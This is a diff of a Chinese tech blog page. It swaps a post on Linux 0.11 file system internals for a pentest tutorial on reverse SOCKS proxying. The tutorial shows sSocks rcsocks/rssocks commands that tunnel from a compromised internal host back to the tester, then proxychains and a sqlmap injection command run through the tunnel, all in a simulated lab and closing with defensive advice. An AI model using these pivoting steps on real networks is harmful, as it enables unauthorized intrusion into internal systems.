@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   
-  <title>文件系统笔记 | 芯机智</title>
+  <title>Archives: 2019 | 芯机智</title>
   
   
 
@@ -46,7 +46,7 @@
   
   
   <div class="cover-wrapper">
-    <cover class='cover post half'>
+    <cover class='cover  half'>
       
         
   <h1 class='title'>WitKit</h1>
@@ -279,11 +279,22 @@
   <div class="l_body">
     <div class='body-wrapper'>
       <div class='l_main'>
-  
-
-  
-    <article id="post" class="post white-box article-type-post" itemscope itemprop="blogPost">
+	
+		
+  <section class="post-list">
+    
       
+        
+          
+        
+      
+    
+    
+      
+        
+          <div class='post-wrapper'>
+            <article class="post reveal ">
+  
 
 
   <section class='meta'>
@@ -292,13 +303,11 @@
     <div class="meta" id="header-meta">
       
         
-  
-    <h1 class="title">
-      <a href="/EMBEDDED/mini2440/文件系统理解.html">
-        文件系统笔记
-      </a>
-    </h1>
-  
+  <h2 class="title">
+    <a href="/NETWORK/Socks代理反弹突破内网.html">
+      Socks代理反弹突破内网
+    </a>
+  </h2>
 
 
       
@@ -324,7 +333,7 @@
             <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2017-08-12</p>
+    <p>2019-08-28</p>
   </a>
 </div>
 
@@ -334,9 +343,9 @@
             
   
   <div class='new-meta-item category'>
-    <a href='/categories/EMBEDDED/mini2440/' rel="nofollow">
+    <a href='/categories/NETWORK/' rel="nofollow">
       <i class="fas fa-folder-open" aria-hidden="true"></i>
-      <p>EMBEDDED&nbsp;/&nbsp;mini2440</p>
+      <p>NETWORK</p>
     </a>
   </div>
 
@@ -345,19 +354,6 @@
         
           
             
-  
-    <div class="new-meta-item browse busuanzi">
-      <a class='notlink'>
-        <i class="fas fa-eye" aria-hidden="true"></i>
-        <p>
-          <span id="busuanzi_value_page_pv">
-            <i class="fas fa-spinner fa-spin fa-fw" aria-hidden="true"></i>
-          </span>
-        </p>
-      </a>
-    </div>
-  
-
 
           
         
@@ -374,240 +370,61 @@
   </section>
 
 
-      <section class="article typo">
-        <div class="article-entry" itemprop="articleBody">
-          <p>以下都是自己瞎理解，并不一定对，但会慢慢完善。</p>
-<p>我们可以想象下，linux文件系统，是吧我们想利用的资源，以虚拟一种树状目录结构管理。最初我们主要想把，硬盘上的内容以树状的结构管理起来。<br>但是发现，其实好多硬件都可以放到这个树中。例如：字符设备串口等。<br>这要我们能清楚的管理硬件。简单既是美。这也是linux可能玩不了复杂的，只能简单的想到一切皆文件的理念吧。</p>
-<p>我们先不考虑虚拟文件系统，其实虚拟文件系统只是在我们这个真实的文件系统上再虚拟一层。因为可能由于兴趣原因，我们不想在每个硬盘上都放一种真实文件，有的像放fat，有的想放ext3，有的想法minix。呵呵，有点开玩笑。由于一个电脑上有多个文件系统。我们又不想让用户用写个应用还得open_ext3 read_ext3z这个样子。所以我们又封装了以下open-&gt;open_ext3,用户还是只要调用open就可以了，所以有了虚拟文件系统。<br>不过我们现在不想管，我们就一个文件系统minix。因为我怕乱了，额。</p>
-<p><img src="内核结构图.PNG" alt=""></p>
-<p>还是以上经典图：</p>
-<p>下面minix文件系统在硬盘上的结构<br><img src="文件系统布局.JPG" alt=""></p>
-<p><strong>超级块</strong>用于存放盘设备上文件系统结构信息</p>
-<p><strong>i节点</strong>存放着文件系统中文件或目录名的索引节点，每个文件或目录都有一个i节点。</p>
-<p><strong>逻辑块位图</strong>用于描述盘上每个数据盘款的使用情况。</p>
-<p><strong>i节点位图</strong>用于说明i节点是否被使用。</p>
-<blockquote>
-<p>int bmap(struct m_inode * inode,int block)</p>
-</blockquote>
-<p>bmap实现了以上i节点和超级块的关联。</p>
-<p>namei也是利用bmap解析文件系统中树目录结构</p>
-<p>下面你会发现namei处在什么位置。</p>
-<p>linux下文件系统和块设备包含的一些概念：</p>
-<ol>
-<li>主设备号：blk_dev[NR_BLK_DEV]</li>
-<li>从设备号：</li>
-</ol>
-<p>通过blk_dev[MAJOR_NR].request_fn = DEVICE_REQUEST;<br>注册void do_hd_request(void)功能</p>
-<p>看看linux 0.11是怎么通过read调用到硬盘上的。</p>
-<p>调用流程</p>
-<pre><code>应用
-| read-&gt;中断
-V
-read_write.c----------------文件系统上层接口-----------------
-| sys_read
-V
-fs/block_dev.c--------------文件系统下层/块设备接口-----------
-| block_read
-V
-fs/buffer.c 
-| breada
-V
-blk_drv/ll_rw_blk.c---------块设备/设备驱动上层接口----------
-| ll_rw_block-&gt;make_request-&gt;add_request-&gt;request_fn
-| -&gt;do_hd_request
-V
-kernel/blk_drv/hd.c---------设备驱动底层接口----------------
-| do_hd_request
-V
-</code></pre><p>每个任务都有一个自己的task_struct <em>current;<br>current中包含了任务打开的文件fd。<br>struct file </em> filp[NR_OPEN];</p>
-<p>open.c<br>open<br>|<br>V<br>open_namei<br>次函数是操作文件系统树目录的重要体现接口。</p>
-<p>open_namei返回的是struct m_inode</p>
-<pre><code>struct m_inode {
-    unsigned short i_mode;
-    unsigned short i_uid;
-    unsigned long i_size;
-    unsigned long i_mtime;
-    unsigned char i_gid;
-    unsigned char i_nlinks;
-    unsigned short i_zone[9];
-/* these are in memory also */
-    struct task_struct * i_wait;
-    unsigned long i_atime;
-    unsigned long i_ctime;
-    unsigned short i_dev;
-    unsigned short i_num;
-    unsigned short i_count;
-    unsigned char i_lock;
-    unsigned char i_dirt;
-    unsigned char i_pipe;
-    unsigned char i_mount;
-    unsigned char i_seek;
-    unsigned char i_update;
-};
-</code></pre><p><img src="i节点结构.JPG" alt=""></p>
-<pre><code>struct super_block {
-    unsigned short s_ninodes;
-    unsigned short s_nzones;
-    unsigned short s_imap_blocks;
-    unsigned short s_zmap_blocks;
-    unsigned short s_firstdatazone;
-    unsigned short s_log_zone_size;
-    unsigned long s_max_size;
-    unsigned short s_magic;
-/* These are only in memory */
-    struct buffer_head * s_imap[8];
-    struct buffer_head * s_zmap[8];
-    unsigned short s_dev;
-    struct m_inode * s_isup;
-    struct m_inode * s_imount;
-    unsigned long s_time;
-    struct task_struct * s_wait;
-    unsigned char s_lock;
-    unsigned char s_rd_only;
-    unsigned char s_dirt;
-};
-</code></pre><p><img src="超级块结构.JPG" alt=""></p>
+  <section class="article typo">
+    <div class="article-entry" itemprop="articleBody">
+      <p><strong>随着信息安全意识的提升，越来越多的信息系统前端均部署有防火墙，系统管理员根据业务需求将内部必要的服务端口通过端口映射等手段映射到公网中，如默认**</strong>web<strong>服务端口</strong>80<strong>、</strong>MSSQL<em>*数据库服务端口</em>1433等。通过部署防火墙可以将信息系统内部区域与公网逻辑隔离开来，利用相关的策略有效避免或减轻来自外部的攻击。</p>
+<p>对于渗透测试者来说，如何绕过防火墙的阻挡在内网展开渗透测试成为亟需解决的问题，本文介绍了在夺取映射到外网的内网服务器权限后，如何利用socks代理反弹获得内网访问权限。</p>
+<p>1.sSocks</p>
+<p>sSocks是一个<a href="http://www.freebuf.com/news/topnews/111545.html" target="_blank" rel="external">socks代理</a>工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试，其最新版为0.0.13，可在以下链接处下载。</p>
+<p><a href="http://sourceforge.net/projects/ssocks/" target="_blank" rel="external">http://sourceforge.net/projects/ssocks/</a></p>
+<p>下载解压后，执行命令编译。</p>
+<pre><code>./configure &amp;&amp; make
+</code></pre><p>编译完成，进入src目录，会发现有nsocks、ssocksd、ssocks、rcsocks，其功能说明介绍如下：</p>
+<p>程序 功能<br><strong>nsocks</strong> 类似通过Socks5代理后的netcat，可用来测试socks server<br><strong>ssocksd</strong> 用来开启Socks5代理服务<br><strong>ssocks</strong> 本地启用Socks5服务，并反弹到另一IP地址<br><strong>rcsocks</strong> 接收反弹过来的Socks5服务，并转向另一端口</p>
+<p><strong>2.模拟网络环境说明</strong></p>
+<p> 本文模拟的网络环境见下图1，渗透测试端IP为192.168.10.50，内网区域IP段192.168.206.0/24，内网区域能正常访问192.168.10.0/24，现假设已获得192.168.206.130权限。 </p>
+<p><a href="http://image.3001.net/uploads/image/20130901/20130901105859_75679.jpg" target="_blank" rel="external"><img src="http://image.3001.net/uploads/image/20130901/20130901105859_75679.jpg" alt="模拟的网络环境"></a></p>
+<p><strong>3.实施Socks代理反弹</strong><br><strong>1)本地监听端口</strong><br>在渗透测试端192.168.10.50执行</p>
+<pre><code>./rcsocks -l 1088 -p 1080 -vv
+</code></pre><p>等待远程Socks5服务器访问本地1080端口，创建端口1080与本地端口1088的连接通道，如图2。 </p>
+<p><a href="http://image.3001.net/uploads/image/20130901/20130901105926_77843.jpg" target="_blank" rel="external"><img src="http://image.3001.net/uploads/image/20130901/20130901105926_77843.jpg" alt="Socks代理反弹突破内网"></a></p>
+<p><strong>2)开启Socks5代理服务，反弹</strong><br>在192.168.206.130上执行</p>
+<pre><code>./rssocks -vv -s 192.168.10.50:1080
+</code></pre><p>启用Socks5服务，反弹到192.168.10.50的端口1080上，如图3。 </p>
+<p><a href="http://image.3001.net/uploads/image/20130901/20130901110001_38329.jpg" target="_blank" rel="external"><img src="http://image.3001.net/uploads/image/20130901/20130901110001_38329.jpg" alt="开启Socks5代理服务，反弹"></a></p>
+<p>此时在渗透测试端192.168.10.50可看到通道连接成功，效果如图4。</p>
+<p><a href="http://image.3001.net/uploads/image/20130901/20130901110020_58042.jpg" target="_blank" rel="external"><img src="http://image.3001.net/uploads/image/20130901/20130901110020_58042.jpg" alt="通道连接成功"></a></p>
+<p><strong>4.利用proxychains进行Socks5代理</strong><br>通过前面的步骤，Socks5代理已创建完成了。由于在渗透测试过程中，需要使用不同的工具程序，而在各程序中分别配置Socks5代理信息较为繁琐，而部分程序并不支持配置Socks5代理。为了简化这些操作，我们可以采用proxychains。<br>proxychains是一个代理客户端软件，可以支持几乎所有程序的代理，如ssh，telnet，ftp等。利用proxychains，程序能在代理的环境下被加载运行，而本身不需要具备代理功能。使用前需要对proxychains进行简单配置，打开配置文件proxychains.conf（在BT5位于/etc/proxychains.conf），如图5所示，在[ProxyList]处添加<br><strong>socks5 127.0.0.1 1088</strong></p>
+<p><a href="http://image.3001.net/uploads/image/20130901/20130901110043_92020.jpg" target="_blank" rel="external"><img src="http://image.3001.net/uploads/image/20130901/20130901110043_92020.jpg" alt="利用proxychains进行Socks5代理"></a></p>
+<p>配置成功后若要启动程序，仅需要在启动程序命令前加上proxychains。<br><strong>1)启用浏览器firefox，在终端执行命令：</strong></p>
+<pre><code>proxychains firefox
+</code></pre><p>firefox启动成功，访问192.168.206.135的web服务如图6，通过代理访问成功。</p>
+<p><a href="http://image.3001.net/uploads/image/20130901/20130901110125_93242.jpg" target="_blank" rel="external"><img src="http://image.3001.net/uploads/image/20130901/20130901110125_93242.jpg" alt="通过代理访问成功"></a></p>
+<p><strong>2)利用sqlmap进行注入：</strong><br>先切换到sqlmap目录<br>cd /pentest/database/sqlmap<br>proxychains python sqlmap.py -u “存在SQL注入的链接” –dbs<br>注入成功，注入点信息及获取数据库信息如图7所示。</p>
+<p><a href="http://image.3001.net/uploads/image/20130901/20130901110208_52827.jpg" target="_blank" rel="external"><img src="http://image.3001.net/uploads/image/20130901/20130901110208_52827.jpg" alt="利用sqlmap进行注入"></a></p>
+<p><strong>5.后记</strong><br>由于系统管理员的疏忽或者业务需求所致，防火墙一般仅对由外向内发起的数据连接进行严格判断、过滤、甚至阻断而忽略由内往外的连接。因此，在此种情况下，通过攻陷映射到公网的端口服务，利用反弹便可获取内网访问权限，给内网安全带来极大的威胁。在信息安全建设与运维过程中，不仅要加强映射到公网的服务安全，也要重视由内到外连接的安全威胁。</p>
 
-        </div>
-        
-          
-
-
-  <section class='meta' id="footer-meta">
-    <hr>
-    <div class='new-meta-box'>
-      
-        
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2017-08-14T18:01:01+08:00">
-  <a class='notlink'>
-    <i class="fas fa-clock" aria-hidden="true"></i>
-    <p>最后更新于 2017年8月14日</p>
-  </a>
-</div>
-
-        
-      
-        
-          
-
-        
-      
-        
-          
-  <div class="new-meta-item share -mob-share-list">
-  <div class="-mob-share-list share-body">
-    
-      
-        <a class="-mob-share-qq" title="QQ好友" rel="external nofollow noopener noreferrer"
-          
-          href="http://connect.qq.com/widget/shareqq/index.html?url=http://demonelf.github.io/EMBEDDED/mini2440/文件系统理解.html&title=文件系统笔记 | 芯机智&summary="
-          
-          >
-          
-            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/assets@19.1.9/logo/128/qq.png">
-          
-        </a>
-      
-    
-      
-        <a class="-mob-share-qzone" title="QQ空间" rel="external nofollow noopener noreferrer"
-          
-          href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://demonelf.github.io/EMBEDDED/mini2440/文件系统理解.html&title=文件系统笔记 | 芯机智&summary="
-          
-          >
-          
-            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/assets@19.1.9/logo/128/qzone.png">
-          
-        </a>
-      
-    
-      
-        <a class="-mob-share-weibo" title="微博" rel="external nofollow noopener noreferrer"
-          
-          href="http://service.weibo.com/share/share.php?url=http://demonelf.github.io/EMBEDDED/mini2440/文件系统理解.html&title=文件系统笔记 | 芯机智&summary="
-          
-          >
-          
-            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/assets@19.1.9/logo/128/weibo.png">
-          
-        </a>
-      
-    
-  </div>
-</div>
-
-
-
-        
       
     </div>
+    
   </section>
+</article>
 
-
+          </div>
         
-        
-            <div class="prev-next">
-                
-                    <section class="prev">
-                        <span class="art-item-left">
-                            <h6><i class="fas fa-chevron-left" aria-hidden="true"></i>&nbsp;上一页</h6>
-                            <h4>
-                                <a href="/NETWORK/linux 下创建GRE隧道.html" rel="prev" title="linux 下创建GRE隧道">
-                                  
-                                      linux 下创建GRE隧道
-                                  
-                                </a>
-                            </h4>
-                            
-                        </span>
-                    </section>
-                
-                
-                    <section class="next">
-                        <span class="art-item-right" aria-hidden="true">
-                            <h6>下一页&nbsp;<i class="fas fa-chevron-right" aria-hidden="true"></i></h6>
-                            <h4>
-                                <a href="/SYSTEM/gentoo【显卡-驱动-xorg-gnome-gui】如何工作.html" rel="prev" title="gentoo【显卡-驱动-xorg-gnome-gui】工作原理">
-                                    
-                                        gentoo【显卡-驱动-xorg-gnome-gui】工作原理
-                                    
-                                </a>
-                            </h4>
-                            
-                        </span>
-                    </section>
-                
-            </div>
-        
-      </section>
-    </article>
+      
+    
+  </section>
   
-
-  
-    <!-- 显示推荐文章和评论 -->
-
-
+    
+    <!-- 根据主题中的设置决定是否在archive中针对摘要部分的MathJax公式加载mathjax.js文件 -->
+    
+    
 
   
 
 
-  
-
-
-
-
-<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
-
-
-
-  <script>
-    window.subData = {
-      title: '文件系统笔记',
-      tools: true
-    }
-  </script>
-
-
+	
 </div>
 <aside class='l_side'>
   
@@ -934,6 +751,14 @@ V
   </div>
 </footer>
 <script>setLoadingBarProgress(80);</script>
+
+
+
+
+	<!-- 根据主题中的设置决定是否在archive中针对摘要部分的MathJax公式加载mathjax.js文件 -->
+	
+
+	
 
 
       <script>setLoadingBarProgress(60);</script>
